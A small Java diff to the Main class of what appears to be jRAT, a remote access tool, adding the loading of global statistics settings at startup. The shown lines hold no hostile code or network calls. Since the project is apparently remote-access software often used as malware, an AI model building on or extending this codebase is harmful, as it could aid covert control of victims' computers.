@@ -17,6 +17,7 @@ import pro.jrat.extensions.PluginLoader;
 import pro.jrat.io.Files;
 import pro.jrat.settings.AbstractSettings;
 import pro.jrat.settings.Settings;
+import pro.jrat.settings.Statistics;
 import pro.jrat.settings.Theme;
 import pro.jrat.threads.ThreadCheckVersion;
 import pro.jrat.threads.ThreadPing;
@@ -96,9 +97,12 @@ public class Main {
 			e.printStackTrace();
 		}
 
+		Statistics.getGlobal().load();
+		
 		instance = new Frame();
-
+		
 		AbstractSettings.loadAllGlobals();
+
 
 		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
 		if (!showEULA) {
